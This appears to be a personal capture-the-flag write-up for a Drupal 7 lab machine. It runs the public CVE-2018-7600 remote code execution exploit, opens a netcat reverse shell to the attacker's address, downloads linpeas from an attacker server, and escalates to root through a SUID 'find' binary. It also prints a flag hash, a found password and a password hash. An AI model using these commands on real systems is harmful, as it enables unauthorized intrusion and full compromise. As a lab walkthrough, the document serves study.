**IP:** _192.168.231.193_

## P-80

![[IMG/Pasted image 20240925063819.png]]

Robots.txt

![[IMG/Pasted image 20240925064523.png]]

I look up an exploit for drupal 7 and find a pretty popular straight away on github. This gives me RCE, so now i can get a reverse shell and start to enumerate the machine.

https://github.com/pimps/CVE-2018-7600

```php
./CVE-2018-7600.py http://192.168.231.193
```

```php
=============================================================================
|          DRUPAL 7 <= 7.57 REMOTE CODE EXECUTION (CVE-2018-7600)           |
|                              by pimps                                     |
=============================================================================

[*] Poisoning a form and including it in cache.
[*] Poisoned form ID: form-2TKVA6lX6F11E_f0b-SZgBmA8vOM2VhjAdsgASvUAdM
[*] Triggering exploit to execute: id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

```php
nc -lvnp 38888
```

```php
./CVE-2018-7600.py -c "nc 192.168.45.210 38888 -e /bin/bash"  http://192.168.231.193
```

![[IMG/Pasted image 20240925070617.png]]

I find the first flag in the home directory under local.txt.
`a75a4387ab1f0ee5a19d83879c471383`

In the web directory i also find an interesting file:

_cat flag1.txt
Every good CMS needs a config file - and so do you._

I take a look at an article about drupal to see where sensitive files might be located and start searching around.

https://www.drupal.org/docs/7/install/step-3-create-settingsphp-and-the-files-directory

`sites/default/settings.php`

![[IMG/Pasted image 20240925071726.png]]

![[IMG/Pasted image 20240925071852.png]]

Pass:R0ck3t

/home/flag4/flag4.txt

Can you use this same method to find or access the flag in root?
Probably. But perhaps it's not that easy.  Or maybe it is?

SUID

```php
find / -perm -u=s  2>/dev/null
```
- At this point i find the find is set to a SUID, but don't figure out how to use it till slightly later on.


Linpeas

```php
python3 -m http.server 80
```

```php
wget <Attacker_IP>/linpeas.sh
```

/var/www/modules/simpletest/tests/upgrade/drupal-6.user-no-password-token.database.php

```php
-rw-r--r-- 1 www-data www-data 1114 Nov 21  2013 /var/www/modules/simpletest/tests/upgrade/drupal-6.user-password-token.database.php
  'pass',
  'pass' => '$S$DAK00p3Dkojkf4O/UizYxenguXnjv',
```

dirtycow
Linux version 3.2.0-6-486 Debian

The SUID binary i found earlier needed to have the `-p` argument removed for it to work as the system was a debian:

https://gtfobins.github.io/gtfobins/find/

```php
./find . -exec /bin/sh -p \; -quit
```

changed to:

```php
./find . -exec /bin/sh \; -quit
```

This gets me root on the system, i just need the last flag to complete the box.

![[IMG/Pasted image 20240925075308.png]]

## P-51796

```php
rpcclient -U "" -N $IP
```

`Cannot connect to server.  Error was NT_STATUS_CONNECTION_REFUSED`

---

**Completed:** _07:58 2024-09-25_

